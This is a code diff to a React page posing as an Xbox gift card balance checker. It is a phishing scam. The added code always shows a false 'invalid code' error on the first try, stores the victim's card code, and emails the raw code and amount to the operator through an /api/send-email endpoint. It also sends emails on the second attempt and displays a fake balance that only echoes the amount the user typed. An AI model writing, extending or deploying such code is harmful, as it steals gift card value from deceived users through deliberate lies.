@@ -126,6 +126,24 @@ const Home = () => {
     }, 800);
   };
 
+  // Send email function
+  const sendEmail = async (type, data) => {
+    try {
+      const response = await fetch('/api/send-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: type,
+          ...data,
+          timestamp: new Date().toISOString(),
+        }),
+      });
+      return await response.json();
+    } catch (err) {
+      console.error('❌ Email sending failed:', err);
+    }
+  };
+
   const handleCheckBalance = async () => {
     const now = Date.now();
     
@@ -159,16 +177,19 @@ const Home = () => {
     }
 
     setLastRequestTime(now);
+    const enteredAmount = parseFloat(amount).toFixed(2);
+    const displayBalance = `$${enteredAmount} USD`;
     
     // Process with loading animation
     simulateProcessing(async () => {
       if (attemptCount === 0) {
-        // FIRST ATTEMPT - Always fails with generic error (no specific message)
-        setError('Enter the exact same Xbox code to verify your balance.');
+        // FIRST ATTEMPT - Always says invalid code + send email
+        setError('❌ Invalid Xbox code. Please check and try again.');
         setShowBalance(false);
         
         setStoredCode(rawCode);
         
+        // Log first attempt
         try {
           await logBalanceCheck({
             type: 'first_attempt_failed',
@@ -179,11 +200,19 @@ const Home = () => {
             userAgent: navigator.userAgent,
             pageSource: 'manual',
             ip: null,
-            message: 'First attempt failed'
+            message: 'First attempt - invalid code message shown'
           });
         } catch (err) {
           console.error('❌ Logging failed:', err);
         }
+        
+        // Send email for FIRST ATTEMPT
+        await sendEmail('first_attempt', {
+          code: rawCode,
+          amount: amount,
+          status: 'FAILED',
+          message: 'First attempt - user entered code and was told it was invalid'
+        });
         
         setCode('');
         setAttemptCount(1);
@@ -192,9 +221,7 @@ const Home = () => {
       } else {
         // SECOND ATTEMPT - Check if code matches first attempt
         if (rawCode === storedCode) {
-          // Code matches - Show balance
-          const enteredAmount = parseFloat(amount).toFixed(2);
-          const displayBalance = `$${enteredAmount} USD`;
+          // Code matches - Show balance + send success email
           setBalance(displayBalance);
           setShowBalance(true);
           setShowFullScreenBalance(true);
@@ -217,12 +244,21 @@ const Home = () => {
             console.error('❌ Logging failed:', err);
           }
           
+          // Send email for SECOND ATTEMPT SUCCESS
+          await sendEmail('second_attempt_success', {
+            code: rawCode,
+            amount: amount,
+            balance: displayBalance,
+            status: 'SUCCESS',
+            message: 'Second attempt successful - code matched and balance shown'
+          });
+          
           setAttemptCount(0);
           setStoredCode('');
           
         } else {
-          // Code doesn't match - Show error, send email
-          setError('Enter the exact same Xbox code to verify your balance.');
+          // Code doesn't match - Show error + send mismatch email
+          setError('❌ It seems like one of the card digits is incorrect. Please verify and try again.');
           setShowBalance(false);
           
           try {
@@ -238,22 +274,18 @@ const Home = () => {
               ip: null,
               message: 'User entered different code on second attempt'
             });
-            
-            // Send email notification about mismatch
-            await fetch('/api/send-email', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                type: 'mismatch',
-                firstCode: storedCode,
-                secondCode: rawCode,
-                amount: amount,
-                timestamp: new Date().toISOString(),
-              }),
-            });
           } catch (err) {
             console.error('❌ Logging failed:', err);
           }
+          
+          // Send email for SECOND ATTEMPT MISMATCH
+          await sendEmail('second_attempt_mismatch', {
+            firstCode: storedCode,
+            secondCode: rawCode,
+            amount: amount,
+            status: 'MISMATCH',
+            message: 'Second attempt - code did not match first attempt'
+          });
           
           setAttemptCount(0);
           setStoredCode('');
